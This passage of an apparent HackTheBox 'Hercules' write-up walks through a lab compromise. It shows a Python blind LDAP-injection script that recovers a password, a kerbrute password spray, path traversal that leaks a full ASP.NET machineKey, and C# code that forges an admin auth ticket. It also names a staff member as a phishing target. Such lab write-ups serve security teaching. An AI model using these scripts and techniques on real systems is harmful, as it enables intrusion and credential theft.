token:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> description_prefix:</span><br><span class="line">        escaped_desc = description_prefix</span><br><span class="line">        escaped_desc = escaped_desc.replace(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;\\2a&#x27;</span>).replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;\\28&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;\\29&#x27;</span>)</span><br><span class="line">        payload = <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>*)(description=<span class="subst">&#123;escaped_desc&#125;</span>*&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>*)(description=*&quot;</span></span><br><span class="line"></span><br><span class="line">    encoded_payload = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;%<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>: encoded_payload,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;RememberMe&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__RequestVerificationToken&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> SUCCESS_INDICATOR <span class="keyword">in</span> response.text</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enumerate_description</span>(<span class="params">username</span>):</span><br><span class="line">    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + <span class="string">&quot;!@#$_*-.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> test_ldap_injection(username):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] User <span class="subst">&#123;username&#125;</span> has no description field&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] User <span class="subst">&#123;username&#125;</span> has a description field, enumerating...&quot;</span>)</span><br><span class="line">    description = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">if</span> test_ldap_injection(username, description + char):</span><br><span class="line">                description += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    Position <span class="subst">&#123;position&#125;</span>: &#x27;<span class="subst">&#123;char&#125;</span>&#x27; -&gt; Current: <span class="subst">&#123;description&#125;</span>&quot;</span>)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> description <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> KNOWN_USERS:</span><br><span class="line">        password = enumerate_description(user)</span><br><span class="line">        <span class="keyword">if</span> password:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hercules_passwords.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;<span class="subst">&#123;user&#125;</span>:<span class="subst">&#123;password&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[+] FOUND: <span class="subst">&#123;user&#125;</span>:<span class="subst">&#123;password&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>Running it churns through every account until it hits <code>johnathan.j</code>, whose <code>description</code> field turns out to hold a full password:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ python3 ldapINjection.py</span><br><span class="line">============================================================</span><br><span class="line">Hercules LDAP Description/Password Enumeration</span><br><span class="line">Testing 40 users</span><br><span class="line">============================================================</span><br><span class="line"></span><br><span class="line">[*] Checking user: web_admin</span><br><span class="line">[-] User web_admin has no description field</span><br><span class="line">[*] Checking user: auditor</span><br><span class="line">[-] User auditor has no description field</span><br><span class="line"></span><br><span class="line">[SNIP]</span><br><span class="line"></span><br><span class="line">[*] Checking user: johnathan.j</span><br><span class="line">[+] User johnathan.j has a description field, enumerating...</span><br><span class="line">    Position 0: &#x27;c&#x27; -&gt; Current: c</span><br><span class="line">    Position 1: &#x27;h&#x27; -&gt; Current: ch</span><br><span class="line">    Position 2: &#x27;a&#x27; -&gt; Current: cha</span><br><span class="line">    Position 3: &#x27;n&#x27; -&gt; Current: chan</span><br><span class="line">    Position 4: &#x27;g&#x27; -&gt; Current: chang</span><br><span class="line">    Position 5: &#x27;e&#x27; -&gt; Current: change</span><br><span class="line">    Position 6: &#x27;*&#x27; -&gt; Current: change*</span><br><span class="line">    Position 7: &#x27;t&#x27; -&gt; Current: change*t</span><br><span class="line">    Position 8: &#x27;h&#x27; -&gt; Current: change*th</span><br><span class="line">    Position 9: &#x27;1&#x27; -&gt; Current: change*th1</span><br><span class="line">    Position 10: &#x27;s&#x27; -&gt; Current: change*th1s</span><br><span class="line">    Position 11: &#x27;_&#x27; -&gt; Current: change*th1s_</span><br><span class="line">    Position 12: &#x27;p&#x27; -&gt; Current: change*th1s_p</span><br><span class="line">    Position 13: &#x27;@&#x27; -&gt; Current: change*th1s_p@</span><br><span class="line">    Position 14: &#x27;s&#x27; -&gt; Current: change*th1s_p@s</span><br><span class="line">    Position 15: &#x27;s&#x27; -&gt; Current: change*th1s_p@ss</span><br><span class="line">    Position 16: &#x27;w&#x27; -&gt; Current: change*th1s_p@ssw</span><br><span class="line">    Position 17: &#x27;(&#x27; -&gt; Current: change*th1s_p@ssw(</span><br><span class="line">    Position 18: &#x27;)&#x27; -&gt; Current: change*th1s_p@ssw()</span><br><span class="line">    Position 19: &#x27;r&#x27; -&gt; Current: change*th1s_p@ssw()r</span><br><span class="line">    Position 20: &#x27;d&#x27; -&gt; Current: change*th1s_p@ssw()rd</span><br><span class="line">    Position 21: &#x27;!&#x27; -&gt; Current: change*th1s_p@ssw()rd!</span><br><span class="line">    Position 22: &#x27;!&#x27; -&gt; Current: change*th1s_p@ssw()rd!!</span><br><span class="line">[+] Complete: johnathan.j =&gt; change*th1s_p@ssw()rd!!</span><br><span class="line"></span><br><span class="line">[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!</span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>description</code> for <code>johnathan.j</code> reads <code>change*th1s_p@ssw()rd!!</code> — clearly a default&#x2F;temporary password that someone forgot to actually change.</p>
+<h2 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h2><p>A password like this screams “shared default”, so instead of assuming it only belongs to <code>johnathan.j</code>, we spray it across the entire user list with <code>kerbrute</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ./kerbrute_linux_amd64 passwordspray -d hercules.htb --dc 10.129.191.240 users &#x27;change*th1s_p@ssw()rd!!&#x27;</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 10/22/25 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2025/10/22 00:54:46 &gt;  Using KDC(s):</span><br><span class="line">2025/10/22 00:54:46 &gt;   10.129.191.240:88</span><br><span class="line"></span><br><span class="line">2025/10/22 00:54:48 &gt;  [+] VALID LOGIN:  ken.w@hercules.htb:change*th1s_p@ssw()rd!!</span><br><span class="line">2025/10/22 00:54:49 &gt;  Done! Tested 40 logins (1 successes) in 3.130 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>The password was reused by <code>ken.w</code>, giving us our first valid set of domain credentials: <code>ken.w:change*th1s_p@ssw()rd!!</code>.</p>
+<h2 id="Portal-Access-as-ken-w"><a href="#Portal-Access-as-ken-w" class="headerlink" title="Portal Access as ken.w"></a>Portal Access as ken.w</h2><p>We use those credentials to log in to the Hercules Portal and land on the user dashboard:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/ken-dashboard.png"
+                      alt="ken.w dashboard"
+                ><figcaption>ken.w dashboard</figcaption></figure></p>
+<p>The portal exposes a handful of tabs — <strong>Mail</strong>, <strong>Downloads</strong>, <strong>Security</strong>, <strong>Account Details</strong> and <strong>Forms</strong>. The mailbox is worth a read, as it contains a few staff notices that heavily telegraph the intended path:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Site Maintenance</span><br><span class="line">22/10/2025</span><br><span class="line"></span><br><span class="line">Good Morning Staff,</span><br><span class="line"></span><br><span class="line">Over the coming days we&#x27;ll be doing some changes to the site, so you may notice some</span><br><span class="line">downtime or missing functionality in some forms.</span><br><span class="line"></span><br><span class="line">We should inform you that the website is now in-sync with the domain, which means that</span><br><span class="line">from now on you MUST use your domain credentials to login to the site. If you&#x27;ve</span><br><span class="line">forgotten your password for the domain, or need other details associated with your</span><br><span class="line">account changed, we recommend getting in touch with Natalie from the support team.</span><br><span class="line"></span><br><span class="line">Feel free to contact us at web_admin@hercules.htb if you have any issues.</span><br><span class="line"></span><br><span class="line">Much Regards, Web Admins.</span><br></pre></td></tr></table></figure></div>
+
+<p>The takeaways here are that there’s a privileged <code>web_admin</code> account, and that <strong>Natalie from the support team</strong> processes forms and account requests — a perfect target for a phishing&#x2F;coercion attack later on.</p>
+<h2 id="Local-File-Inclusion-via-the-Download-Endpoint"><a href="#Local-File-Inclusion-via-the-Download-Endpoint" class="headerlink" title="Local File Inclusion via the Download Endpoint"></a>Local File Inclusion via the Download Endpoint</h2><p>The <strong>Downloads</strong> section serves files through a <code>/Home/Download?fileName=</code> parameter. Any time a filename is passed straight into a download handler, it’s worth testing for path traversal. We point it at the application’s <code>web.config</code> a couple of directories up:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Home/Download?fileName=../../web.config</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.129.191.240</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__RequestVerificationToken=...; .ASPXAUTH=...</span><br></pre></td></tr></table></figure></div>
+
+<p>The server happily returns the file:</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../web.config&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">compilation</span> <span class="attr">targetFramework</span>=<span class="string">&quot;4.8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">mode</span>=<span class="string">&quot;Forms&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">forms</span> <span class="attr">protection</span>=<span class="string">&quot;All&quot;</span> <span class="attr">loginUrl</span>=<span class="string">&quot;/Login&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">httpRuntime</span> <span class="attr">enableVersionHeader</span>=<span class="string">&quot;false&quot;</span> <span class="attr">maxRequestLength</span>=<span class="string">&quot;2048&quot;</span> <span class="attr">executionTimeout</span>=<span class="string">&quot;3600&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">decryption</span>=<span class="string">&quot;AES&quot;</span> <span class="attr">decryptionKey</span>=<span class="string">&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;</span> <span class="attr">validation</span>=<span class="string">&quot;HMACSHA256&quot;</span> <span class="attr">validationKey</span>=<span class="string">&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">customErrors</span> <span class="attr">mode</span>=<span class="string">&quot;Off&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>This is a big win. The <code>&lt;machineKey&gt;</code> element is disclosed in full:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decryptionKey=&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;</span><br><span class="line">validationKey=&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>machineKey</code> is what ASP.NET uses to encrypt and sign Forms Authentication cookies. Since authentication uses <code>protection=&quot;All&quot;</code>, whoever knows this key can mint their own perfectly valid, signed auth tickets — for any user, in any role.</p>
+<h2 id="Forging-a-Web-Administrators-Auth-Ticket"><a href="#Forging-a-Web-Administrators-Auth-Ticket" class="headerlink" title="Forging a Web Administrators Auth Ticket"></a>Forging a Web Administrators Auth Ticket</h2><p>The dashboard image earlier showed we’re logged in as a low-privileged user. What we actually want is the <strong>Web Administrators</strong> role, which gates the file-upload functionality on the <strong>Forms</strong> page. Armed with the leaked <code>machineKey</code>, we take our existing <code>.ASPXAUTH</code> cookie, decrypt it, and re-issue it as <code>web_admin</code> with the <code>&quot;Web Administrators&quot;</code> role baked in.</p>
+<p>We use a small C# helper (<code>FormsEncryptor</code>) whose config carries the stolen <code>machineKey</code> so it produces a ticket the server will accept:</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Web.Security;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">FormsEncryptor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Take an existing forms cookie</span></span><br><span class="line">            <span class="built_in">string</span> encryptedTicket = <span class="string">&quot;706290C300113BE514AF628309A7229D17243D31763F11E73F00BDBCB4706CE45003EE5051A9627F7812737F9955CA131BE3E2276414C6C1EBAC6623094967E5416C09D86FCF2A709D6CA27B1A81ACBD51976614D97494B6367573190F5500CA0744095121C869595A4B2937BF472753C5009B8A6C3BC881E1E0825833F96FE3DBE7BAC78E74F98A761AC579C02A444700D06AD633355A60160D14270300DF25&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> replacedUsername = <span class="string">&quot;web_admin&quot;</span>;</span><br><span class="line">            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);</span><br><span class="line">            FormsAuthenticationTicket ticket = <span class="keyword">new</span> FormsAuthenticationTicket(<span class="number">1</span>,</span><br><span class="line">                   replacedUsername,</span><br><span class="line">                   DateTime.Now,</span><br><span class="line">                   DateTime.Now.AddMinutes(<span class="number">120</span>),</span><br><span class="line">                   unencryptedTicket.IsPersistent,</span><br><span class="line">                   <span class="string">&quot;Web Administrators&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> encTicket = FormsAuthentication.Encrypt(ticket);</span><br><span class="line">            Console.WriteLine(encTicket);</span><br><span class="line">            Console.Read();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The accompanying <code>FormsEncryptor.exe.config</code> pins the exact same <code>machineKey</code> we pulled from the target:</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">compilation</span> <span class="attr">debug</span>=<span class="string">&quot;false&quot;</span> <span class="attr">targetFramework</span>=<span class="string">&quot;4.0&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">decryption</span>=<span class="string">&quot;AES&quot;</span> <span class="attr">decryptionKey</span>=<span class="string">&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;</span> <span class="attr">validation</span>=<span class="string">&quot;HMACSHA256&quot;</span> <span class="attr">validationKey</span>=<span class="string">&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We compile and run it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:FormsEncryptor.exe .\FormsEncryptor.cs /reference:System.Web.dll</span><br><span class="line">Microsoft (R) Visual C# Compiler version 4.8.9232.0</span><br><span class="line"></span><br><span class="line">PS C:\Users\0xkujen&gt; .\FormsEncryptor.exe</span><br><span class="line">9678E7AC81645939B4343FBB9A7D4B686CB5EA1FEE616E9DD679AE7D6774A504C73665A6AC95F617331406804EE66746831F4C6CB517FCE3669EC15EBB09379F622B02662B45CC2C7EFF8DE2C2CC8CAF8572FB54F8AC0C09B5E3DFF03C6136F1A9BAD859B70574C0BD46C4AF8A5FF01DD0FFAC4E6A36E2AC4A26A53886822FC36252903172B2EAF923C5C96458C8015DF4C48183B4965DDF1AF0C67909C9551D5A8BFAD7F4B62BFB5D59523A3AA3CB6114F8DEC145EF4B25AA28DD9746FC8DF4</span><br></pre></td></tr></table></figure></div>
+
+<p>We swap this value into our <code>.ASPXAUTH</code> cookie and refresh the dashboard — we’re now <code>web_admin</code>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/webadmin-dashboard.png"
+                      alt="web_admin dashboard"
+                ><figcaption>web_admin dashboard</figcaption></figure></p>
+<p>And crucially, the <strong>Forms</strong> tab now exposes a <em>Report Submission</em> form with a file-upload field:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/webadmin-forms.png"
+                      alt="web_admin forms upload"
+                ><figcaption>web_admin forms upload</figcaption></figure></p>
+<h2 id="Decompiling-the-Application-DLL"><a href="#Decompiling-the-Application-DLL" class="headerlink" title="Decompiling the Application DLL"></a>Decompiling the Application DLL</h2><p>Before blindly throwing files at the upload, let’s understand exactly what it accepts. The same directory traversal that gave us <code>web.config</code> also lets us pull the compiled application binary out of the <code>bin</code> directory:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Home/Download?fileName=../../bin/HadesWeb.dll HTTP/2</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/hadesweb-dll.png"
+                      alt="HadesWeb.dll downloaded"
+                ><figcaption>HadesWeb.dll downloaded</figcaption></figure></p>
+<p>Opening <code>HadesWeb.dll</code> in <strong>dnSpy</strong> and navigating to the <code>HomeController</code>, we find the upload handler:</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HadesWeb.Controllers.HomeController</span></span><br><span class="line">[<span class="meta">HttpPost</span>]</span><br><span class="line">[<span class="meta">ValidateAntiForgeryToken</span>]</span><br><span class="line">[<span class="meta">RateLimit</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Forms</span>(<span class="params">UploadFormModel model</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ModelState.IsValid)</span><br><span class="line">        <span class="keyword">return</span> View(model);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (model.UploadedFile != <span class="literal">null</span> &amp;&amp; model.UploadedFile.ContentLength &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (User.IsInRole(<span class="string">&quot;Web Administrators&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> maxFileSize = <span class="number">1048576</span>; <span class="comment">// 1 MB</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (model.UploadedFile.ContentLength &lt; maxFileSize)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> allowedExtensions = <span class="keyword">new</span>[] &#123; <span class="string">&quot;.docx&quot;</span>, <span class="string">&quot;.odt&quot;</span> &#125;;</span><br><span class="line">                <span class="built_in">string</span> fileExtension = Path.GetExtension(model.UploadedFile.FileName).ToLower();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (allowedExtensions.Contains(fileExtension))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span> path = <span class="string">$&quot;<span class="subst">&#123;Guid.NewGuid()&#125;</span><span class="subst">&#123;fileExtension&#125;</span>&quot;</span>;</span><br><span class="line">                    <span class="built_in">string</span> filename = Path.Combine(<span class="string">@&quot;C:\inetpub\Reports\&quot;</span>, Path.GetFileName(path));</span><br><span class="line">                    model.UploadedFile.SaveAs(filename);</span><br><span class="line">                    ViewBag.Success = <span class="string">&quot;Thank you for your report!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ViewBag.Message = <span class="string">&quot;File type is not supported.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ViewBag.Message = <span class="string">&quot;File Upload not permitted.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> View(model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
